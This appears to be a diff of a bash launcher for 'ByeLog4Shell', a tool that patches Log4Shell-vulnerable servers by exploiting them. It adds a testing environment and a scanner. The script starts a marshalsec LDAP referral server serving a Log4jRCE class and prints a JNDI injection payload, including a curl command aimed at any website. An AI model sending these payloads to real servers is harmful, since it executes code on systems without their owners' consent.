@@ -7,7 +7,9 @@ die() {
 }
 usage() {                                 
   echo "Usage:  $0 -h | --help | Display This Usage Page
-  	$0 -i | --install | Install ByeLog4Shell and its Dependencies
+  	$0 -i | --install | Install ByeLog4Shell and its Dependencies (Without The Scanner and Log4Shell Testing Env)
+  	$0 -ia | --install-all | Install all ByeLog4Shell Features and Depencies (With Scanner and Testing Env)
+  	$0 -rte | --run-testing-env | Run the Log4Shell Testing Env (will start an other Terminal and will run in BG till its closed)
   	$0 -s [URL] | --scan [URL] | Scan an Website for Log4Shell Vulnerability
         $0 -rp | --run-persistent | Run ByeLog4Shell in Persistent mode
         $0 -rt | --run-transient | Run ByeLog4Shell in Transient mode" 1>&2 
@@ -16,13 +18,37 @@ exit_abnormal() {
   usage
   exit 1
 }
-installb() {
-echo Installing Dependencies for ByeLog4Shell
+testingenv() {
+echo "Starting Testing env"
+cd L4S-E-T
+gnome-terminal -- sudo bash make.sh run
+echo "Tip: Run curl -X GET -G --data-urlencode 'foo=\${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a}' [Website] to see some Hacking action on the Env"
+}
+
+installall() {
+echo "Installing Extra Features and Dependencies for ByeLog4Shell"
 sudo apt-get update
-sudo apt install -y maven netcat-traditional gnome-terminal python3 unzip docker.io
+sudo apt install -y maven gnome-terminal unzip docker.io python3
 unzip ByeLog4Shell.zip
 cd ByeLog4ShellScanner
-sudo pip3 install -r requirements.txt
+pip install -r requirements.txt
+cd ..
+cd L4S-E-T
+sudo bash make.sh build
+cd ..
+cd ByeLog4ShellVaccinator
+mvn package
+cd ..
+cd byelog4shellserver
+mvn package -DskipTests
+cd ..
+}
+
+installb() {
+echo "Installing Dependencies for ByeLog4Shell"
+sudo apt-get update
+sudo apt install -y maven gnome-terminal unzip
+unzip ByeLog4Shell.zip
 cd ..
 cd ByeLog4ShellVaccinator
 mvn package
@@ -40,8 +66,9 @@ cd ..
 cd ..
 cd byelog4shellserver/target
 gnome-terminal -- java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8888/#Log4jRCETransient
-gnome-terminal -- nc -lvnp 80
 echo "Now enter \${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a} into a vulnerable field (such as user name) to Vaccinate a Server against Log4Shell Vulnerability"
+echo "Or enter this Command in the Terminal:"
+echo "curl -X GET -G --data-urlencode 'foo=\${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a}' [Website]"
 exit
 }
 runp() {
@@ -53,8 +80,9 @@ cd ..
 cd ..
 cd byelog4shellserver/target
 gnome-terminal -- java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8888/#Log4jRCETransient
-gnome-terminal -- nc -lvnp 80
 echo "Now enter \${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a} into a vulnerable field (such as user name) to Vaccinate a Server against Log4Shell Vulnerability"
+echo "Or enter this Command in the Terminal:"
+echo "curl -X GET -G --data-urlencode 'foo=\${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a}' [Website]"
 exit
 }
 while :; do
@@ -67,6 +95,16 @@ while :; do
 	 -i|--install)
 	echo ByeLog4Shell By Qerim Iseni09
         installb
+            exit
+            ;;
+        -ia|--install-all)
+	echo ByeLog4Shell By Qerim Iseni09
+        installall
+            exit
+            ;;
+        -rte|--run-testing-env)
+	echo ByeLog4Shell By Qerim Iseni09
+        testingenv
             exit
             ;;
         -rp|--run-persistence)
@@ -84,6 +122,7 @@ while :; do
         if [ -z "$2" ]
         then
       	echo "Error: Expected an Url"
+      	exit
 	else
 	cd ByeLog4ShellScanner
 	python3 Scanner.py -w -r -u $2
